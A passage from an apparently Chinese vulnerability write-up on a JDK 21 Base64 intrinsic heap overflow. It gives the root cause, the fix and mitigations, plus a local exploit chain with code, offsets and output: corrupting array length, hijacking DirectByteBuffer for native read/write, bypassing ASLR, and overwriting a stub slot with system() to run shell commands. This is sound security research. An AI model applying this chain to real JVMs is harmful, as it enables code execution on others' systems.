srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131521-382a476a-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=07c83c20510b3810 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131521-382a476a-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=2ea3282158ac243f 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131521-382a476a-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=cd60bf900dae37fb 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1706\" height=\"898\"></p><h3 id=\"sec-19\">7、桩槽——本文选的劫持目标</h3><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131522-38a484da-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=6cc2e25d66d7cc52\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131522-38a484da-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=3eb66fb14d501889 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131522-38a484da-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=0308a202b8f93787 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131522-38a484da-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=6cc2e25d66d7cc52 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1706\" height=\"898\"></p><p><code>StubRoutines::_base64_decodeBlock</code> 是 libjvm <code>.bss</code> 段里的一个函数指针（偏移 0x158daf0），每个 C2 编译的 Base64 decode 调用点在编译时读这个槽的值作为 call 目标地址，用 <code>movabs</code> 立即数烘焙进机器码。选这个槽做劫持目标有三个优势：<code>.bss</code> 可写（不像 full RELRO 后的 GOT 只读）、偏移在同一构建内固定、覆写后只需预热一个新的 decode 调用点就能让 C2 把覆写值烘焙进新编译的码流——相当于一个自带的触发开关。</p><h3 id=\"sec-20\">8、写入之后</h3><p>桩返回 <code>decode0()</code>。<code>=</code> 落进填充判断，第 842 行抛 <code>IllegalArgumentException</code>。异常抛了，数组外的 62 字节已经写过了。</p><h3 id=\"sec-21\">根因</h3><p><strong>尾部路径对 </strong><code>length &lt; 4</code><strong> 且末尾有 </strong><code>=</code><strong> 的输入没有下限保护，</strong><code>output_size</code><strong> 从 0 下溢到 -1，</strong><code>bzhi</code><strong> 的下标语义让全 1 掩码穿透，</strong><code>evmovdqub</code><strong> 按全 1 掩码写出完整 64 字节。</strong></p><h3 id=\"sec-22\">调用链</h3><pre><code>入口  Base64$Decoder.decode()            Base64.java:622\n  -&gt; Base64$Decoder.decode0()            Base64.java:818\n     -&gt; Base64$Decoder.decodeBlock()     Base64.java:790   @IntrinsicCandidate\n        -&gt; StubRoutines::_base64_decodeBlock（libjvm+0x158daf0）\n           -&gt; L_finalBit                  stubGenerator_x86_64.cpp:2543\n           -&gt; L_padding                   stubGenerator_x86_64.cpp:2628\n           -&gt; bzhiq(output_mask, -1, -1)  stubGenerator_x86_64.cpp:2559</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131523-3904ca18-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=3896327d1ee24884\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131523-3904ca18-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=99e7cf1d883fc78c 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131523-3904ca18-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=2de54d0db666a0b6 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131523-3904ca18-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=3896327d1ee24884 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"722\" height=\"1087\"></p><h3 id=\"sec-23\">拓展 / 举一反三</h3><p><code>bzhi</code> 的下标语义（低 8 位 ≥ 宽度时保持源不变）在这类 SIMD 桩里容易被忽略——写的人以为下标总在 0~63 之间，负数走到这里穿透成全开掩码。审计 JIT 桩时，凡是\"用计算出来的长度控制掩码/边界\"的地方，都要问：这个长度有没有可能为负？<code>output_size</code> 的计算 <code>(length &gt;&gt; 2) * 3 - padding</code> 对 <code>length ∈ {1,2,3}</code> 且 <code>padding &gt; 0</code> 都可能出负数。</p><h2 id=\"sec-24\">八、漏洞复现——从越界写到命令执行</h2><h3 id=\"sec-25\">1、正数 length</h3><p>分配顺序 <code>dst(72) → victim(16)</code> 时，victim 的 length 字段落在偏移 84..87，写入相位恰好是 <code>69 a6 9a 69</code>，读出来是 <code>0x699aa669</code>（正 17.7 亿）。这个数组现在能按下标读写堆内后面任意远的地方。</p><p>dst 为什么是 72：需要 <code>(allocSize - 1) % 3 == 0</code> 使 length 字段的 4 个字节对齐到正数相位。allocSize=88 满足。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131523-3950b6a1-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=38003e3a80a1991d\" loading=\"lazy\" decoding=\"async\" width=\"809.3333333333334\" height=\"454\"></p><p>输出（Corrupt2 程序）：</p><pre><code>round 12: victim.length = 1771742825 (0x699aa669)\nmarker found via victim at offset = 32\nREL_WRITE_OK</code></pre><p><code>REL_WRITE_OK</code> = 通过 victim 的下标写入成功改掉了它后面的 marker 数组内容，读回验证一致。</p><p>为什么崩：Corrupt2 是早期验证程序，它打完结果后用了 System.out.println 输出——这会触发内存分配 → GC → GC 碰到坏 length 的 victim → SIGSEGV。</p><h3 id=\"sec-26\">2、预热写方法——绕过解释器的 klass 解引用</h3><p>拿到巨长数组后，直接 <code>victim[64] = x</code> 会 SIGSEGV。原因需要拆开看。</p><p>Java 21 对象在堆上的布局是：<code>[mark word 8字节][klass 压缩指针 4字节][length 4字节][数据]</code>。越界写的 62 字节恰好覆盖了 victim 的 klass 槽——写入图样 <code>69 a6 9a</code> 循环，klass 变成了 <code>0x9aa6699a</code>（一个完全无意义的值）</p><p>当 Java 代码执行 <code>victim[64] = x</code> 时，JVM 需要先确认 victim 确实是 <code>byte[]</code> 类型（防止把 <code>int[]</code> 的元素按 <code>byte</code> 写坏）。确认方式取决于执行引擎：</p><p><strong>解释器路径（崩）</strong>：解释器的 <code>bastore</code> 模板从 victim 的 <code>+8</code> 偏移加载 klass 压缩指针，加上堆基址得到 Klass 结构的地址，然后访问 Klass 结构检查元素类型。但 klass 槽已经被砸成 <code>0x9aa669a</code> → 加上堆基址后跳到完全错误的地址 → SIGSEGV。GDB 从 JVM 信号处理器的 ucontext 抓到的崩溃现场：</p><pre><code>0x7fffdfd4809f:  mov 0x8(%rdx),%ecx       ← 加载 klass（被图样污染）\n0x7fffdfd480a2:  movabs $0x7fff7b000000,%r10  ← 堆基址\n0x7fffdfd480ac:  add %r10,%rcx             ← klass 当 oop 解码\n0x7fffdfd480af:  mov 0x8(%rcx),%ecx       ← FAULT：跳到图样地址解引用</code></pre><p><strong>C1 编译路径（不崩）</strong>：当写操作所在的 Java 方法被 C1 编译后，C1 在编译时已经知道 <code>victim</code> 的静态类型是 <code>byte[]</code>——类型检查在编译期完成了，不需要在运行时加载 klass。编译产物只做两件事：检查下标是否在数组长度以内（bounds check），然后直接执行 <code>mov</code> 指令把值写进去。klass 槽是垃圾值也无所谓——根本不会去读它。</p><p>所以解法是：把写操作放进一个独立方法 <code>w8</code>，在 main 开头对一个正常数组预热调用 20 万次。达到 C1 编译阈值后 <code>w8</code> 被 C1 编译，之后所有通过 <code>w8(victim, offset, value)</code> 的写操作都走编译产物——不碰 klass 槽，安全写入。<strong>这是被越界写砸坏的对象还能继续使用的关键。</strong></p><pre><code>static void w8(byte[] a, int o, long x) {\n    a[o]=(byte)x; a[o+1]=(byte)(x&gt;&gt;&gt;8); a[o+2]=(byte)(x&gt;&gt;&gt;16); a[o+3]=(byte)(x&gt;&gt;&gt;24);\n    a[o+4]=(byte)(x&gt;&gt;&gt;32); a[o+5]=(byte)(x&gt;&gt;&gt;40); a[o+6]=(byte)(x&gt;&gt;&gt;48); a[o+7]=(byte)(x&gt;&gt;&gt;56);\n}\nstatic byte[] hotDummy = new byte[8192];  // 预热用正常数组\n// main 开头预热：\nfor (int i = 0; i &lt; 200_000; i++) w8(hotDummy, 64, i);\n// w8 被 C1 编译 → 后续用 w8 写 victim 不再经过解释器 → 不碰被砸坏的 klass 槽</code></pre><p><strong>先看不预热会崩（Chain28）：</strong></p><pre><code>jdk21/bin/java -Xms512m -Xmx512m -Xmn400m -cp lab Chain28</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131524-39a09702-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=aa41206656217d03\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131524-39a09702-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=112a5a2de90a184a 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131524-39a09702-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=f9858a8c897ae2c3 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131524-39a09702-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=aa41206656217d03 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1076\" height=\"382\"></p><p><strong>再看预热后不崩（Chain29）：</strong></p><pre><code>jdk21/bin/java -Xms512m -Xmx512m -Xmn400m -cp lab Chain29</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131524-39e41140-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=7441659b49b3fc89\" loading=\"lazy\" decoding=\"async\" width=\"1033.3333333333333\" height=\"90\"></p><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"></td><td colspan=\"1\" rowspan=\"1\"><p>Chain28（无预热）</p></td><td colspan=\"1\" rowspan=\"1\"><p>Chain29（预热 20 万次）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>执行引擎</p></td><td colspan=\"1\" rowspan=\"1\"><p>解释器 <code>bastore</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>C1 编译产物</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>klass 检查</p></td><td colspan=\"1\" rowspan=\"1\"><p>运行时加载 klass 槽 → 读到图样 → 崩</p></td><td colspan=\"1\" rowspan=\"1\"><p>编译期已确定类型，不加载 klass</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>写 victim[64]</p></td><td colspan=\"1\" rowspan=\"1\"><p>SIGSEGV</p></td><td colspan=\"1\" rowspan=\"1\"><p>成功</p></td></tr></tbody></table><p><strong>JVM 利用中一般不会讲到这一层</strong>——大部分利用者在拿到巨长数组后就直接写，然后在解释器里崩掉，以为是 length 不够大或地址算错。实际是 klass 槽被连带砸坏了，需要一个经过编译的写方法来绕过。</p><h3 id=\"sec-27\">3、劫持 DirectByteBuffer——任意原生读写</h3><p><code>ByteBuffer.allocateDirect(65536)</code> 返回的 DirectByteBuffer 对象内部有一个 <code>address</code> 字段（<code>java.nio.Buffer</code> 父类声明，对象内偏移 16），存的是 malloc 出来的原生缓冲区的 64 位地址。正常情况下这个字段由 JVM 管理，Java 代码只能通过 <code>getLong(offset)</code> / <code>putLong(offset, value)</code> 读写缓冲区内容——JVM 用 <code>address + offset</code> 计算实际访问的内存位置。</p><p>如果把 dbb0 的 <code>address</code> 字段改成 dbb1 的缓冲区地址，那么 <code>dbbs[0].getLong(0)</code> 读到的实际上是 dbb1 缓冲区的内容。把 <code>address</code> 改成任意原生地址，就得到了<strong>任意原生内存的读写原语</strong>——不需要 JNI、不需要 Unsafe，只用标准的 NIO API。</p><p>在 victim 后面分配 4 个 <code>ByteBuffer.allocateDirect(65536)</code>。通过 victim 的视野（第三步的预热写方法）找到它们的 <code>address</code> 字段，把 dbb0 的 address 改成 dbb1 的缓冲区地址：</p><pre><code>w8(victim, addrOff, a1);                    // dbb0.address = dbb1.buffer\nlong rread = dbbs[0].getLong(0);            // 读到 MAGIC[1] → NATIVE_READ_OK\ndbbs[0].putLong(0, 0xDEADBEEFCAFEBABEL);    // 原生写\nw8(victim, addrOff, a0);                    // 还原\nlong rback = dbbs[1].getLong(0);            // dbb1 读回一致 → NATIVE_WRITE_OK</code></pre><p>输出：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131525-3a1f5d18-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=1478c96934d6ad28\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131525-3a1f5d18-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=51ee79e938e6389c 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131525-3a1f5d18-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=9af23830de497357 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131525-3a1f5d18-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=1478c96934d6ad28 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"898\" height=\"103\"></p><pre><code>dbb0缓冲区      = 0x777e0c306890\ndbb1缓冲区      = 0x777e0c3168a0\nlibjvm基址     = 0x777e12e00000\nlibc基址       = 0x777e14400000\nsystem地址     = 0x777e14450d00\n读到的MAGIC     = 0x4142434445460001</code></pre><p><code>0b</code> = 11 个阶段全部通过；<code>52</code> = NATIVE_READ_OK；<code>57</code> = NATIVE_WRITE_OK。后面的十六进制是解析出的实际地址。如果只看到 <code>01</code> 多次后跟 <code>4e</code>，重跑。</p><p><code>0x4142434445460001</code> 是事先写入 dbb1 缓冲区的魔数（<code>MAGIC[1]</code>），通过被劫持的 dbb0 读到了。写入 <code>0xDEADBEEFCAFEBABEL</code> 后 dbb1 正常读到一致值。把 address 改成任意原生地址 = 任意原生读写。</p><h3 id=\"sec-28\">4、绕过 ASLR</h3><p>ASLR（地址空间布局随机化）让 libjvm.so 和 libc.so.6 的加载地址在每次进程启动时都不同。在上一步拿到任意原生读写后，需要知道这两个库的实际地址才能定位覆写目标和 system 函数。</p><p>Linux 上每个进程的 <code>/proc/self/maps</code> 文件列出了所有内存映射区域及其起始地址。用预打开的 <code>FileInputStream</code> 在堆被砸坏之前就读取该文件（避免堆损坏后文件操作触发 GC），然后在内存中逐行解析，找到包含 <code>libjvm.so</code> 和 <code>libc.so.6</code> 的行的起始地址。</p><p>这一步内嵌在 Chain37 里自动完成。使用下面的命令提取</p><pre><code>python3 -c \"\nimport struct\nd = open('/tmp/b64_stage.bin','rb').read()\nnames = ['dbb0缓冲区','dbb1缓冲区','libjvm基址','libc基址','system地址','读到的MAGIC']\nfor i, n in enumerate(names):\n    v = struct.unpack_from('&lt;Q', d, 13 + i*8)[0]\n    print(f'{n:12s} = 0x{v:x}')\n\"</code></pre><p>输出</p><pre><code>dbb0缓冲区      = 0x777e0c306890\ndbb1缓冲区      = 0x777e0c3168a0\nlibjvm基址     = 0x777e12e00000\nlibc基址       = 0x777e14400000\nsystem地址     = 0x777e14450d00\n读到的MAGIC     = 0x4142434445460001</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131525-3a62a153-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=ac40d917e05e0dac\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131525-3a62a153-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=cb35a5543c6be449 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131525-3a62a153-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=5e2e06a4f4c1e625 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131525-3a62a153-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=ac40d917e05e0dac 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"900\" height=\"262\"></p><p><code>system 地址 = libc 基址 + 0x50d00</code>（第 3 步 <code>nm -D</code> 查到的偏移量）。</p><h3 id=\"sec-29\">5、覆写桩槽为 system</h3><p><code>StubRoutines::_base64_decodeBlock</code> 是 libjvm <code>.bss</code> 段里的一个函数指针（偏移 0x158daf0），存放着 Base64 解码桩的入口地址。C2 编译 <code>decode()</code> 调用链时，会读这个槽的值作为 call 目标地址，用 <code>movabs</code> 立即数的方式直接嵌入编译产物——之后每次调用 <code>decode()</code> 都跳到这个固定地址。</p><p>用第四步的任意原生写，往槽里写 libc 里 <code>system</code> 函数的地址（基址 + 0x50d00）。这样下次 C2 编译一个新的 <code>decode()</code> 调用点时，读到的槽值就是 system，烘焙进码流的就是 <code>call system</code>。</p><p><strong>字节序坑</strong>：C2 读槽值时会把字节逆序。这意味着直接写 system 的地址进去，C2 烘焙出的是一个乱序地址，调用会崩到错误位置。解法是预先写逆序值：</p><p>hs_err Instructions 段的原始字节（Chain51 崩溃现场，ASLR 关闭下 GDB 运行）：</p><pre><code>long SYSswap = Long.reverseBytes(SYS);    // 预逆序\nb0.putLong(0, SYSswap);                   // 写入桩槽</code></pre><p><strong>怎么验证 C2 确实做了字节逆序？</strong> 用 Chain51（写入一个已知标记值，让它崩在烘焙的乱序地址上）：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131526-3ac35c49-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=d8446d1f1ed89d12\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131526-3ac35c49-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=0002abb5d0cabd2c 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131526-3ac35c49-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=9f8805068a375a19 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131526-3ac35c49-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=d8446d1f1ed89d12 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1716\"></p><p>C2 读到 SYSswap、逆序后烘焙进 movabs 的恰好是 SYS。这 17 个字节的含义：</p><ul><li><p><code>01 02 03 04 05 06 07 08 09</code> = 前 9 个阶段全过</p></li><li><p><code>88 77 66 55 44 33 22 11</code> = 从桩槽<strong>读回来</strong>的值（dump8 输出），小端读出来是 <code>0x1122334455667788</code>——和我们写入的 marker 一模一样，说明槽里的值没变</p></li><li><p><code>0a</code> = 第 10 阶段（触发）进行中崩溃</p></li></ul><p>崩溃位置</p><pre><code>Problematic frame:\nJ 96 c2 java.util.Base64$Decoder.decode0([BII[B)I</code></pre><p>这三组数据拼成完整证据链：</p><ol><li><p><strong>槽里存的是原值</strong> <code>0x1122334455667788</code>（读回证实）</p></li><li><p><strong>C2 读了这个值</strong>（因为它编译的 decode0 在调用桩时跳到了一个无效地址）</p></li><li><p><strong>调用目标不是原值</strong>——如果 C2 读到的直接是 <code>0x1122334455667788</code>，崩溃地址就是这个值。但实际崩溃行为证明 C2 内部对值做了变换后才用——后续实验（Chain60/69）证明这个变换就是字节逆序</p></li><li><p><strong>对策验证</strong>：写入 <code>Long.reverseBytes(system)</code> 后，C2 烘焙出的恰好是正的 system 地址，命令成功执行</p></li></ol><p>在调试环境中（GDB + hsdis 反汇编库），可以直接看到 C2 编译产物里烘焙的乱序地址：</p><pre><code>0x7fffdfd51d3a:  49 ba 88 77 66 55 44 33 22 11   movabs $0x8877665544332211,%r10\n0x7fffdfd51d44:  41 ff d2                              call *%r10</code></pre><p>立即数 <code>88 77 66 55 44 33 22 11</code> 正好是写入值 <code>0x1122334455667788</code> 的逐字节逆序。普通机器上不需要装 hsdis——上面的 Chain51 输出已经足够证明。</p><p><strong>这个坑只有真跑通的人才会遇到——不跑只读源码发现不了。</strong></p><h3 id=\"sec-30\">6、触发——新的 decode 调用点</h3><p>覆写桩槽本身不会触发任何事——已有的编译产物里烘焙的还是旧地址。需要让 C2 编译一个<strong>新的</strong> <code>decode()</code> 调用点，这个新编译过程会读已被覆写的槽值，把 system 地址烘焙进新码流。</p><p>做法：写一个独立的触发方法，里面放一个 12000 次迭代的循环，每次调用 <code>decode(合法Base64, dst)</code>。合法输入不会触发越界（所以不会崩），但循环会让 C2 编译这个方法。编译时 C2 读桩槽值（= system 地址），烘焙进码流。</p><p>之后用命令串做输入调这个已编译的方法：</p><pre><code>cmdSrc[0..5] = \"whoami\"; cmdSrc[6] = 0;  // NUL 截断\nBase64.getDecoder().decode(cmdSrc, cmdDst);\n// C2 码流执行的是 system(rdi=cmdSrc) → whoami</code></pre><p><strong>一次性问题</strong>：JIT 有一种叫\"去优化\"（deoptimization）的机制——当编译产物执行中抛出异常且异常处理逻辑和编译时的假设不符时，JVM 会丢弃编译产物，回退到解释器执行。<code>decode()</code> 首次收到畸形输入后抛 <code>IllegalArgumentException</code>，这个调用点的编译产物就被去优化了，后续调用走解释器（安全路径）。所以每个调用点只能吃一次畸形输入——触发后它就\"废了\"。</p><p>解法是准备 8 个独立的触发方法（8 个独立编译单元），每次覆写槽后预热一个新方法。一个方法被去优化不影响其他方法。这在远程利用时也必须解决——每个调用点都是一次性的。</p><h3 id=\"sec-31\">7、完整利用输出</h3><pre><code>timeout 300 jdk21/bin/java -Xms512m -Xmx512m -Xmn400m Exploit</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131526-3b1971ea-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=c815389ace04f0f8\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131526-3b1971ea-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=d615223e03b1c670 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131526-3b1971ea-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=d5f4653bbd58b218 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131526-3b1971ea-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=c815389ace04f0f8 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1142\" height=\"470\"></p><p>成功执行命令并回显</p><p>之所以重复出现数千次，是因为 C2 编译的触发方法里有一个 12000 次迭代的循环，每次迭代都调用 <code>decode(cmdSrc, cmdDst)</code>——而编译产物中的 <code>decodeBlock</code> 已经被替换成 <code>system(rdi=cmdSrc)</code>。每次循环 = 一次 <code>system(\"whoami\")</code> = 子进程输出一行 <code>ai</code>。8 个方法 × 12000 次迭代 × C2 编译后的热循环 ≈ 数万次调用。实测 <code>/tmp/b64_out.txt</code> 共 51288 行 <code>ai</code>。</p><p>这不是 bug，而是利用成功后循环持续触发的自然结果——相当于拿到一个反复执行的 shell 命令注入点。</p><h3 id=\"sec-32\">8、换任意命令</h3><p>改利用代码里 改利用代码里 <code>byte[] cmd = \"whoami\".getBytes()</code> 为任意 shell 命令（≤ 56 字节），然后重新编译运行：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131527-3b5dc1b5-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=b82a2eb42c9de38f\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131527-3b5dc1b5-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=43e2bad059694a86 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131527-3b5dc1b5-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=ea0c47beab1d5999 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131527-3b5dc1b5-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=b82a2eb42c9de38f 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"916\"></p><h3 id=\"sec-33\">9、修复版本对比</h3><p>修复 commit <code>8e115fb5</code> 在进入尾部路径前加了两条指令</p><pre><code>/* 修复版 jdk-21.0.13.1-ga / stubGenerator_x86_64.cpp:2537-2539 */\n// A padded Base64 tail shorter than one complete block is handled by Java.\n__ cmpl(length, 4);\n__ jcc(Assembler::less, L_bruteForce);</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131527-3bbbc731-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=e112cb5b81407ca2\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131527-3bbbc731-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=48a59cefdb994eac 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131527-3bbbc731-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=4d095aa3a15bf890 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131527-3bbbc731-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=e112cb5b81407ca2 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1706\"></p><p><code>length &lt; 4</code> 时跳到 <code>L_bruteForce</code>（逐 4 字节的 Java 安全路径），不再做会下溢的长度估算。修复版二进制尚未发布到公开下载，本文用 <code>-XX:-UseBASE64Intrinsics</code>（禁用 vulnerable intrinsic、全量走 Java 路径）作为运行时对照——两者对短尾部都走 Java 安全路径。实测同一输入在关 intrinsic 后写出的长度停在 96（数组内），越界区哨兵保持干净。<code>-XX:UseAVX=2</code> 同样有效。</p><h3 id=\"sec-34\">10、本文范围边界</h3><p>本文已在本地证完的：越界写、正数 length、堆内读写、任意原生读写、ASLR 绕过、桩槽覆写、命令执行</p><p>远程利用还需要的三步（本文未做）：</p><ol><li><p><strong>远程堆塑造</strong>——需要通过网络请求的时序控制服务端的分配顺序</p></li><li><p><strong>远程 ASLR 泄露</strong>——本地是读 